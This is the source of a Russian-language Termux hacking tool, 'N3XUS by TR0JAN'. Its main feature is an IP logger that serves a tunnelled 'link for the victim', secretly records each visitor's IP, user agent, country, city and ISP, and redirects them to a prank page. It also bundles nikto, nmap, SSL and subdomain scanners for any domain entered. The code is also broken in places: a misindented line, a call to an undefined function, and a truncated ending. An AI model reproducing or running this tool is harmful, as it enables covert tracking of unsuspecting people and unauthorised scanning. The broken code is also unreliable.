import curses
import time
import threading
import subprocess
import os
import sys
import re
import json
import random
import logging
import urllib.request
from flask import Flask, request, redirect
from datetime import datetime

# ============ АВТОУСТАНОВКА ============

def check_command(cmd):
    try:
        result = subprocess.run(
            ["which", cmd],
            capture_output=True, text=True, timeout=5
        )
        return result.returncode == 0
    except Exception:
        return False

def run_install(cmd, desc):
    print(f"\n[+] {desc}...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print("    OK")
        return True
    else:
        print(f"    ОШИБКА: {result.stderr[:200]}")
        return False

def progress_bar(step, total, desc):
    percent = int((step / total) * 100)
    bar_len = 30
    filled = int(bar_len * step / total)
    bar = "█" * filled + "░" * (bar_len - filled)
    print(f"\r[{bar}] {percent}%  {desc}", end="", flush=True)

def check_and_install():
    termux_bin = "/data/data/com.termux/files/usr/bin"
    current_path = os.environ.get("PATH", "")
    if termux_bin not in current_path:
        os.environ["PATH"] = termux_bin + ":" + current_path
    
    needed = []
    
    if not check_command("python"):
        needed.append(("pkg install python -y", "Python"))
    if not check_command("cloudflared"):
        needed.append(("pkg install cloudflared -y", "cloudflared"))
    if not check_command("termux-wake-lock"):
        needed.append(("pkg install termux-api -y", "Termux API"))
    if not check_command("curl"):
        needed.append(("pkg install curl -y", "curl"))
    
    try:
        import flask
    except ImportError:
        needed.append(("pip install flask", "Flask"))
    
    if not check_command("nikto"):
        needed.append((
            "pkg install git perl -y && cd ~ && git clone https://github.com/sullo/nikto.git 2>/dev/null; ln -sf ~/nikto/program/nikto.pl $PREFIX/bin/nikto && chmod +x $PREFIX/bin/nikto",
            "Nikto"
        ))
    
    if not check_command("nmap"):
        needed.append(("pkg install nmap -y", "nmap"))
    
    if not check_command("sslscan"):
        needed.append(("pkg install sslscan -y", "sslscan"))
    
    testssl_path = os.path.expanduser("~/testssl.sh/testssl.sh")
    if not os.path.exists(testssl_path):
        needed.append((
            "pkg install git openssl -y && cd ~ && git clone https://github.com/drwetter/testssl.sh.git 2>/dev/null; chmod +x ~/testssl.sh/testssl.sh",
            "testssl.sh"
        ))
    
    if not needed:
        print("[+] Всё уже установлено. Запуск N3XUS...")
        time.sleep(1)
        return
    
    print("=" * 60)
    print("  N3XUS INSTALLER by TR0JAN")
    print("=" * 60)
    print(f"  Нужно установить: {len(needed)} компонентов")
    for cmd, desc in needed:
        print(f"    - {desc}")
    print("=" * 60)
    
    total = len(needed)
    for i, (cmd, desc) in enumerate(needed, 1):
        progress_bar(i - 1, total, f"Установка {desc}...")
        run_install(cmd, desc)
        progress_bar(i, total, f"Установка {desc}...")
        time.sleep(0.3)
    
    print("\n")
    print("=" * 60)
    print("  УСТАНОВКА ЗАВЕРШЕНА")
    print("=" * 60)
    print("\n  Запуск N3XUS через 2 секунды...")
    time.sleep(2)

# ============ ОСНОВНОЙ КОД ============

LOGO = [
    "███╗   ██╗██████╗ ██╗  ██╗██╗   ██╗███████╗",
    "████╗  ██║╚════██╗╚██╗██╔╝██║   ██║██╔════╝",
    "██╔██╗ ██║ █████╔╝ ╚███╔╝ ██║   ██║███████╗",
    "██║╚██╗██║ ╚═══██╗ ██╔██╗ ██║   ██║╚════██║",
    "██║ ╚████║██████╔╝██╔╝ ██╗╚██████╔╝███████║",
    "╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
]

captured_ip = None
captured_ua = None
captured_time = None
captured_country = None
captured_city = None
captured_isp = None
public_url = None
redirect_url = "https://traiantadgs-ops.github.io/prank/"
site_scan_result = {}
subdomain_result = {}
subdomain_vuln_result = {}
port_scan_result = {}
ssl_result = {}
ssl_deep_result = {}
scan_started = False

def get_geo(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=country,city,isp,query"
        with urllib.request.urlopen(url, timeout=3) as r:
            data = json.loads(r.read().decode())
            return (
                data.get("country", "?"),
                data.get("city", "?"),
                data.get("isp", "?")
            )
    except Exception:
        return ("?", "?", "?")

def scan_site(url):
    result = {}
    if not url.startswith("http"):
        url = "http://" + url
    result["URL"] = url
    
    try:
        r = subprocess.run(
            ["nikto", "-h", url, "-nointeractive", "-maxtime", "60s"],
            capture_output=True, text=True, timeout=90
        )
        lines = r.stdout.split("\n")
        findings = []
        for line in lines:
            if "+ " in line and "Target" not in line and "Start" not in line and "End" not in line:
                findings.append(line.strip()[:80])
        result["Уязвимости"] = findings[:15] if findings else ["Не найдено"]
    except Exception as e:
        result["Уязвимости"] = [f"Ошибка: {str(e)[:60]}"]
    
    try:
        r = subprocess.run(
            ["curl", "-sI", "--max-time", "10", url],
            capture_output=True, text=True, timeout=15
        )
        headers = []
        for line in r.stdout.split("\n"):
            if ":" in line and not line.startswith("HTTP"):
                headers.append(line.strip()[:80])
        result["Заголовки"] = headers[:8] if headers else ["Не найдено"]
    except Exception as e:
        result["Заголовки"] = [f"Ошибка: {str(e)[:60]}"]
    
    try:
        r = subprocess.run(
            ["curl", "-s", "--max-time", "10", url],
            capture_output=True, text=True, timeout=15
        )
        if r.stdout:
            title = re.search(r"<title>(.*?)</title>", r.stdout, re.IGNORECASE)
            if title:
                result["Заголовок"] = title.group(1)[:80]
            else:
                result["Заголовок"] = "Не найден"
        else:
            result["Заголовок"] = "Пусто"
    except Exception as e:
        result["Заголовок"] = f"Ошибка: {str(e)[:60]}"
    
    return result

def find_subdomains(domain):
    result = {}
    domain = domain.replace("https://", "").replace("http://", "").strip("/")
    result["Домен"] = domain
    
    subs = set()
    
    try:
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        with urllib.request.urlopen(url, timeout=20) as r:
            data = json.loads(r.read().decode())
        for entry in data:
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                sub = sub.strip().lower()
                if sub and "*" not in sub and domain in sub:
                    subs.add(sub)
    except Exception:
        pass
    
    if not subs:
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
            with urllib.request.urlopen(url, timeout=20) as r:
                text = r.read().decode()
            for line in text.split("\n"):
                if "," in line:
                    sub = line.split(",")[0].strip().lower()
                    if sub and domain in sub:
                        subs.add(sub)
        except Exception:
            pass
    
    result["Поддомены"] = sorted(list(subs))[:30] if subs else ["Не найдено"]
    return result

def scan_ports(host):
    result = {}
    host = host.replace("https://", "").replace("http://", "").strip("/")
    if ":" in host:
        host = host.split(":")[0]
    result["Хост"] = host
    
    try:
        r = subprocess.run(
            ["nmap", "-F", "-T4", host],
            capture_output=True, text=True, timeout=120
        )
        lines = r.stdout.split("\n")
        ports = []
        for line in lines:
            if "/tcp" in line and ("open" in line or "filtered" in line):
                ports.append(line.strip()[:80])
        result["Порты"] = ports[:20] if ports else ["Не найдено"]
    except Exception as e:
        result["Порты"] = [f"Ошибка: {str(e)[:60]}"]
    
    return result

def ssl_check_basic(domain):
    result = {}
    domain = domain.replace("https://", "").replace("http://", "").strip("/")
    if ":" in domain:
        domain = domain.split(":")[0]
    result["Домен"] = domain
    
    try:
        r = subprocess.run(
            ["sslscan", "--no-colour", f"{domain}:443"],
            capture_output=True, text=True, timeout=60
        )
        output = r.stdout
        lines = output.split("\n")
        protocols = []
        cert_info = []
        for line in lines:
            line = line.strip()
            if "SSLv" in line or "TLSv" in line:
                protocols.append(line[:80])
            if "Issuer:" in line or "Not valid" in line or "Subject:" in line:
                cert_info.append(line[:80])
        result["Протоколы"] = protocols[:10] if protocols else ["Не найдено"]
        result["Сертификат"] = cert_info[:6] if cert_info else ["Не найдено"]
    except FileNotFoundError:
        result["Ошибка"] = "sslscan не установлен"
    except Exception as e:
        result["Ошибка"] = str(e)[:60]
    
    return result

def ssl_check_deep(domain):
    result = {}
    domain = domain.replace("https://", "").replace("http://", "").strip("/")
    if ":" in domain:
        domain = domain.split(":")[0]
    result["Домен"] = domain
    
    testssl_path = os.path.expanduser("~/testssl.sh/testssl.sh")
    if not os.path.exists(testssl_path):
        result["Ошибка"] = "testssl.sh не установлен"
        return result
    
    try:
        r = subprocess.run(
            [testssl_path, "--quiet", "--color", "0", domain],
            capture_output=True, text=True, timeout=300
        )
        lines = r.stdout.split("\n")
        findings = []
        for line in lines:
            line = line.strip()
            if any(k in line for k in ["POODLE", "DROWN", "Heartbleed", "FREAK", "LOGJAM", "BEAST", "CRIME", "RC4", "expired", "vulnerable"]):
                findings.append(line[:80])
        result["Уязвимости"] = findings[:15] if findings else ["Чисто"]
    except Exception as e:
        result["Ошибка"] = str(e)[:60]
    
    return result
        flask_app = Flask(__name__)

@flask_app.route("/")
def index():
    global captured_ip, captured_ua, captured_time
    global captured_country, captured_city, captured_isp
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "Unknown")
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    captured_ip = ip
    captured_ua = ua
    captured_time = t
    
    country, city, isp = get_geo(ip)
    captured_country = country
    captured_city = city
    captured_isp = isp
    
    with open(os.path.expanduser("~/log.txt"), "a") as f:
        f.write(f"{t} | IP: {ip} | {country} | {city} | {isp} | UA: {ua}\n")
    
    return redirect(redirect_url, code=302)

def run_flask():
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.CRITICAL)
    log.disabled = True
    flask_app.logger.disabled = True
    sys.stderr = open(os.devnull, 'w')
    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def run_cloudflared():
    global public_url
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    for line in proc.stdout:
        if "api.trycloudflare" in line:
            continue
        m = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m:
            public_url = m.group(0)
            break

def wake_lock_on():
    try: subprocess.run(["termux-wake-lock"], check=False)
    except Exception: pass

def wake_lock_off():
    try: subprocess.run(["termux-wake-unlock"], check=False)
    except Exception: pass

def start_server():
    global public_url
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(1)
    threading.Thread(target=run_cloudflared, daemon=True).start()
    wake_lock_on()
    public_url = None

def main(stdscr):
    global public_url, redirect_url, site_scan_result
    global subdomain_result, subdomain_vuln_result, scan_started
    global port_scan_result, ssl_result, ssl_deep_result
    global captured_ip, captured_ua, captured_time
    global captured_country, captured_city, captured_isp
    curses.curs_set(0)
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(15, curses.COLOR_WHITE, -1)
    curses.init_pair(12, curses.COLOR_BLUE, -1)
    
    stdscr.nodelay(True)
    stdscr.timeout(30)
    server_started = False
    state = "menu"
    waiting_input = ""
    last_command = ""
    user_input = ""
    
    while True:
        stdscr.erase()
        
        glitch_lines = {}
        for i in range(len(LOGO)):
            if random.random() < 0.15:
                glitch_lines[i] = True
        
        for i, line in enumerate(LOGO):
            display_line = line
            if i in glitch_lines and len(line) > 0:
                chars = list(display_line)
                glitch_chars = "$#@%&*!?<>/\\|~^"
                for _ in range(random.randint(1, 3)):
                    pos = random.randint(0, len(chars) - 1)
                    if chars[pos] != " ":
                        chars[pos] = random.choice(glitch_chars)
                display_line = "".join(chars)
            
            try:
                stdscr.addstr(i, 0, display_line, curses.color_pair(15) | curses.A_BOLD)
            except curses.error:
                pass
        
        try:
            stdscr.addstr(len(LOGO) + 1, 4, "[ BETA VERSION ]", curses.color_pair(15) | curses.A_DIM)
            stdscr.addstr(len(LOGO) + 2, 15, "[ N3XUS v1.0 — by TR0JAN ]", curses.color_pair(15) | curses.A_BOLD)
            stdscr.addstr(len(LOGO) + 3, 0, "═" * 60, curses.color_pair(15))
        except curses.error: pass
        
        if state == "menu":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[1] 1P L0GG3R (BETA)", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 6, 4, "[2] С4ЙТ СК4НН3Р", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "[3] SUBD0M41N F1ND3R", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 8, 4, "[4] P0RT SC4N", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 9, 4, "[5] SSL CH3CK", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 10, 4, "[0] Выход", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 12, 4, "Выберите пункт: " + user_input, curses.color_pair(15))
            except curses.error: pass
        
        elif state == "logger_menu":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[1] Без редиректа (ловить IP)", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 6, 4, "[2] Ввести свою ссылку для редиректа", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "[0] Назад", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 9, 4, "Выберите пункт: " + user_input, curses.color_pair(15))
            except curses.error: pass
        
        elif state == "link_input":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "Введи ссылку для редиректа:", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "> " + user_input, curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Enter — сохранить | 0 + Enter — отмена", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "site_input":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "Введи URL сайта (например example.com):", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "> " + user_input, curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Enter — сканировать | 0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "site_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] С4ЙТ СК4НН3Р РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in site_scan_result.items():
                    if y > 28: break
                    if isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:3]:
                            if y > 28: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "subdomain_input":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "Введи домен (например example.com):", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "> " + user_input, curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Enter — искать | 0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "subdomain_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] SUBD0M41N РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in subdomain_result.items():
                    if y > 24: break
                    if isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:8]:
                            if y > 24: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "[1] Сканировать на уязвимости", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(y + 2, 4, "[0] Назад в меню", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "subdomain_scanning":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[*] СКАНИРОВАНИЕ ПОДДОМЕНОВ...", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 7, 4, "Это займёт 1-3 минуты.", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 8, 4, "ЭКРАН МОЖЕТ НЕ ОБНОВЛЯТЬСЯ.", curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Это НЕ баг — так и должно быть.", curses.color_pair(15) | curses.A_DIM)
                stdscr.addstr(len(LOGO) + 11, 4, "Пожалуйста, подожди...", curses.color_pair(15))
            except curses.error: pass
        
        elif state == "subdomain_vuln_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] SUBD0M41N VULN РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in subdomain_vuln_result.items():
                    if y > 28: break
                    if isinstance(v, dict):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for sub, findings in list(v.items())[:3]:
                            if y > 28: break
                            stdscr.addstr(y, 6, f"{sub}:", curses.color_pair(12))
                            y += 1
                            for f in findings[:2]:
                                if y > 28: break
                                stdscr.addstr(y, 8, f"- {str(f)[:60]}", curses.color_pair(15))
                                y += 1
                    elif isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:5]:
                            if y > 28: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "port_input":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "Введи хост или IP (например example.com):", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "> " + user_input, curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Enter — сканировать | 0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "port_scanning":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[*] СКАНИРОВАНИЕ ПОРТОВ...", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 7, 4, "Это займёт 30-60 секунд.", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 8, 4, "ЭКРАН МОЖЕТ НЕ ОБНОВЛЯТЬСЯ.", curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Это НЕ баг — так и должно быть.", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "port_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] P0RT SC4N РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in port_scan_result.items():
                    if y > 28: break
                    if isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:20]:
                            if y > 28: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "ssl_input":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "Введи домен (например example.com):", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 7, 4, "> " + user_input, curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Enter — проверить | 0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "ssl_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] SSL CH3CK РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in ssl_result.items():
                    if y > 24: break
                    if isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:5]:
                            if y > 24: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "[1] Улучшить сканирование (testssl)", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(y + 2, 4, "[0] Назад в меню", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "ssl_scanning":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[*] ГЛУБОКОЕ СКАНИРОВАНИЕ SSL...", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 7, 4, "Это займёт 2-5 минут.", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 8, 4, "ЭКРАН МОЖЕТ НЕ ОБНОВЛЯТЬСЯ.", curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 9, 4, "Это НЕ баг — так и должно быть.", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "ssl_deep_result":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] SSL D33P РЕЗУЛЬТАТ", curses.color_pair(12) | curses.A_BOLD)
                y = len(LOGO) + 7
                for k, v in ssl_deep_result.items():
                    if y > 26: break
                    if isinstance(v, list):
                        stdscr.addstr(y, 4, f"{k}:", curses.color_pair(15) | curses.A_BOLD)
                        y += 1
                        for item in v[:10]:
                            if y > 26: break
                            stdscr.addstr(y, 6, f"- {str(item)[:70]}", curses.color_pair(15))
                            y += 1
                    else:
                        stdscr.addstr(y, 4, f"{k}: {str(v)[:70]}", curses.color_pair(15))
                        y += 1
                stdscr.addstr(y + 1, 4, "0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        elif state == "waiting":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] 1P L0GG3R АКТИВЕН", curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 7, 4, "Ссылка для жертвы:", curses.color_pair(15))
                if public_url:
                    stdscr.addstr(len(LOGO) + 8, 4, public_url, curses.color_pair(15) | curses.A_BOLD)
                else:
                    stdscr.addstr(len(LOGO) + 8, 4, "Получение ссылки...", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 9, 4, "Редирект: " + redirect_url[:60], curses.color_pair(15) | curses.A_DIM)
                stdscr.addstr(len(LOGO) + 11, 4, "Ждём переход...", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 12, 4, "[WAKE LOCK: ON]", curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 14, 4, "Ввод: " + waiting_input, curses.color_pair(15))
                if last_command:
                    stdscr.addstr(len(LOGO) + 15, 4, "Последняя команда: " + last_command, curses.color_pair(15) | curses.A_DIM)
                stdscr.addstr(len(LOGO) + 17, 4, "Enter — команда | 0 + Enter — назад", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        elif state == "caught":
            try:
                stdscr.addstr(len(LOGO) + 5, 4, "[+] ЖЕРТВА ПОЙМАНА!", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 7, 4, "IP: " + str(captured_ip), curses.color_pair(15) | curses.A_BOLD)
                stdscr.addstr(len(LOGO) + 8, 4, "Страна: " + str(captured_country), curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 9, 4, "Город: " + str(captured_city), curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 10, 4, "Провайдер: " + str(captured_isp), curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 11, 4, "Время: " + str(captured_time), curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 12, 4, "UA: " + str(captured_ua)[:50], curses.color_pair(15))
                stdscr.addstr(len(LOGO) + 14, 4, "Напиши 0 + Enter для возврата в меню", curses.color_pair(15) | curses.A_DIM)
            except curses.error: pass
        
        stdscr.refresh()
        ch = stdscr.getch()
        
        if state == "menu":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "1":
                    state = "logger_menu"
                    user_input = ""
                elif user_input == "2":
                    state = "site_input"
                    user_input = ""
                elif user_input == "3":
                    state = "subdomain_input"
                    user_input = ""
                elif user_input == "4":
                    state = "port_input"
                    user_input = ""
                elif user_input == "5":
                    state = "ssl_input"
                    user_input = ""
                elif user_input == "0":
                    break
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "logger_menu":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "1":
                    if not server_started:
                        start_server()
                        server_started = True
                    redirect_url = "https://traiantadgs-ops.github.io/prank/"
                    captured_ip = None
                    captured_country = None
                    captured_city = None
                    captured_isp = None
                    state = "waiting"
                    user_input = ""
                    waiting_input = ""
                    last_command = ""
                elif user_input == "2":
                    state = "link_input"
                    user_input = ""
                elif user_input == "0":
                    state = "menu"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "link_input":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "logger_menu"
                    user_input = ""
                elif user_input != "":
                    redirect_url = user_input
                    if not server_started:
                        start_server()
                        server_started = True
                    captured_ip = None
                    captured_country = None
                    captured_city = None
                    captured_isp = None
                    state = "waiting"
                    user_input = ""
                    waiting_input = ""
                    last_command = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "site_input":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input != "":
                    site_scan_result = scan_site(user_input)
                    state = "site_result"
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "site_result":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "subdomain_input":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input != "":
                    subdomain_result = find_subdomains(user_input)
                    state = "subdomain_result"
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "subdomain_result":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input == "1":
                    subs = subdomain_result.get("Поддомены", [])
                    if isinstance(subs, list) and subs and subs[0] != "Не найдено":
                        state = "subdomain_scanning"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "subdomain_scanning":
            if not scan_started:
                scan_started = True
                subs = subdomain_result.get("Поддомены", [])
                if isinstance(subs, list) and subs:
                    subdomain_vuln_result = scan_subdomains_for_vulns(subs)
                state = "subdomain_vuln_result"
                scan_started = False
        
        elif state == "subdomain_vuln_result":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "port_input":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input != "":
                    state = "port_scanning"
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "port_scanning":
            if not scan_started:
                scan_started = True
                port_scan_result = scan_ports(user_input)
                state = "port_result"
                scan_started = False
        
        elif state == "port_result":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "ssl_input":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input != "":
                    ssl_result = ssl_check_basic(user_input)
                    state = "ssl_result"
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "ssl_result":
            if ch == -1: pass
            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                elif user_input == "1":
                    state = "ssl_scanning"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "ssl_scanning":
            if not scan_started:
                scan_started = True
                domain = ssl_result.get("Домен", "")
                if domain:
                    ssl_deep_result = ssl_check_deep(domain)
                state = "ssl_deep_result"
                scan_started = False
        
        elif state == "ssl_deep_result":
            if ch == -1: pass
